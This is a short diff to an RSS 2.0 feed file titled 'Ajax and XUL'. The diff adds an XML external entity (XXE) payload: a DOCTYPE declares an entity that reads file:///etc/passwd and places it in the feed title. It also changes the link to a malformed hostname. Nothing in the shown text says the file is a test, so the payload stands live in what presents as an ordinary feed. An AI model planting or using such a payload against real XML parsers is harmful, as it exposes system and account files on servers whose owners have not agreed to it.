@@ -1,8 +1,9 @@
 <?xml version="1.0" ?>
+<!DOCTYPE name [ <!ENTITY hackpwd SYSTEM “file:///etc/passwd”>]>
 <rss version="2.0">
 <channel>
-  <title>Ajax and XUL</title>
-  <link>https://www.xul.fr/en/</link>
+  <title>Hello, &hackpwd;</title>
+  <link>https://www.xul.XULfr/en/</link>
   <description>XML graphical interface etc...</description>
   <image>
       <url>https://www.xul.fr/xul-icon.gif</url>
